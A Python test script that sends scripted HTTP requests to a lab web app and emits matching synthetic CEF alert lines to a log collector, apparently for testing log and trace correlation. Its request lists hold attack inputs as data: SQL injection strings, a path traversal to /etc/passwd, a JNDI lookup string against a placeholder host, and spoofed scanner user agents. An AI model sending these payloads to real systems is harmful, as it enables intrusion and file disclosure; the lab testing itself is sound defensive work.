"""Scripted probe: HTTP requests to the lab app, plus one synthetic CEF line per request to FlowPorts.

Runs inside the compose network (`docker compose run --rm client`). Environment:
  MODE   story (3 requests, default) | suite (11 requests) | drill (DRILL_N requests, DRILL_GAP s apart)
  ROUTE  two hex characters written into every trace id, e.g. a1 (route A) or b1 (route B)
  NO_TP  1 = send no traceparent (to try the IP + port join on its own)
Prints one JSON line per request (send time, path, traceparent, client IP), then the CEF lines it sent.
The CEF device ("ExampleSec ExampleIDS") is fictional; rt is the client's own send time in epoch ms.
"""
import json
import os
import socket
import time
import urllib.error
import urllib.parse
import urllib.request

ROUTE = os.environ.get("ROUTE", "a1")
MODE = os.environ.get("MODE", "story")
NO_TP = os.environ.get("NO_TP") == "1"
APP = os.environ.get("APP_URL", "http://app:8080")
CEF = (os.environ.get("CEF_HOST", "flowports"), int(os.environ.get("CEF_PORT", "1515")))
SQLMAP = "sqlmap/1.8.4#stable (https://sqlmap.org)"
NIKTO = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)"
JNDI = "${jndi:ldap://probe.example.invalid/a}"
Q = urllib.parse.quote
my_ip = socket.gethostbyname(socket.gethostname())
app_ip = socket.gethostbyname(urllib.parse.urlparse(APP).hostname)

if MODE == "suite":
    REQ = [("normal", "/health", None, {}), ("normal", "/user?id=1", None, {}), ("normal", "/user_safe?id=1", None, {}),
           ("normal", "/file?name=hello.txt", None, {}), ("sqli", "/user?id=" + Q("1 OR 1=1"), None, {}),
           ("sqli", "/user?id=" + Q("1 UNION SELECT 99, sqlite_version()"), None, {}),
           ("sqli_safe", "/user_safe?id=" + Q("1 OR 1=1"), None, {}),
           ("traversal", "/file?name=" + Q("../../etc/passwd"), None, {}), ("traversal", "/file?name=" + Q("/etc/hostname"), None, {}),
           ("scanner", "/health", SQLMAP, {}), ("scanner", "/user?id=2", NIKTO, {})]
    GAP = 1.0
elif MODE == "drill":
    N = int(os.environ.get("DRILL_N", "240"))
    GAP = float(os.environ.get("DRILL_GAP", "1"))
    REQ = [("drill", f"/health?seq={i:04d}", "Mozilla/5.0 lab-drill", {}) for i in range(1, N + 1)]
else:  # story: benign; SQL injection with a scanner UA and a JNDI string in a header; JNDI string in a parameter
    REQ = [("benign", "/health", "Mozilla/5.0 lab-probe", {}),
           ("sqli+sqlmap+jndi", "/user?id=" + Q("1 OR 1=1"), SQLMAP, {"X-Api-Version": JNDI}),
           ("jndi-in-param", "/file?name=" + Q(JNDI), SQLMAP, {})]
    GAP = 2.0
RUN = f"lab-{ROUTE}"


def cef(r):
    benign = r["label"] in ("benign", "normal", "drill", "sqli_safe")
    sev = 3 if benign else 8
    sig = "100" if benign else ("2001" if "sqli" in r["label"] else "2002")
    name = "HTTP allowed" if benign else ("SQL injection attempt" if "sqli" in r["label"] else "Suspicious request")
    req = r["path"].replace("\\", "\\\\").replace("=", "\\=")
    ua = (r["ua"] or "Python-urllib").replace("\\", "\\\\").replace("=", "\\=")
    ts = time.strftime("%b %d %H:%M:%S", time.gmtime(r["t_ns"] / 1e9))
    ext = (f"rt={r['t_ns'] // 1000000} src={r['client_ip']} dst={r['app_ip']} dpt=8080 requestMethod=GET request={req} "
           f"requestClientApplication={ua} act=alert cs1Label=probeRun cs1={RUN}-{r['i']:04d}")
    return f"<134>{ts} exampleids01 CEF:0|ExampleSec|ExampleIDS|1.0|{sig}|{name}|{sev}|{ext}"


out = []
for i, (label, path, ua, extra) in enumerate(REQ, 1):
    tid = f"5eed{ROUTE}{'0' * 20}{i:06d}"
    sid = f"{'ab' * 6}{ROUTE}{i % 256:02x}"
    h = {"User-Agent": ua} if ua else {}
    if not NO_TP:
        h["traceparent"] = f"00-{tid}-{sid}-01"
    h.update(extra)
    t0 = time.time()
    try:
        with urllib.request.urlopen(urllib.request.Request(APP + path, headers=h), timeout=10) as resp:
            st = resp.status
    except urllib.error.HTTPError as e:
        st = e.code
    except Exception as e:  # noqa: BLE001 - record and continue
        st = f"ERR {e}"
    rec = {"i": i, "label": label, "t_send_utc": time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(t0)) + f".{int((t0 % 1) * 1000):03d}Z",
           "t_ns": int(t0 * 1e9), "path": path, "ua": ua, "traceparent": h.get("traceparent"),
           "client_ip": my_ip, "app_ip": app_ip, "status": st}
    out.append(rec)
    print(json.dumps(rec), flush=True)
    if MODE == "drill":  # one CEF line per request, sent at once on its own connection
        try:
            s = socket.create_connection(CEF, timeout=5)
            s.sendall((cef(rec) + "\n").encode())
            s.close()
        except Exception as e:  # noqa: BLE001
            print("CEF-ERR", i, e, flush=True)
    time.sleep(GAP)

if MODE != "drill":  # all CEF lines after the traffic, on one connection
    lines = [cef(r) for r in out]
    s = socket.create_connection(CEF, timeout=10)
    s.sendall(("\n".join(lines) + "\n").encode())
    s.close()
    for line in lines:
        print("CEF", line, flush=True)
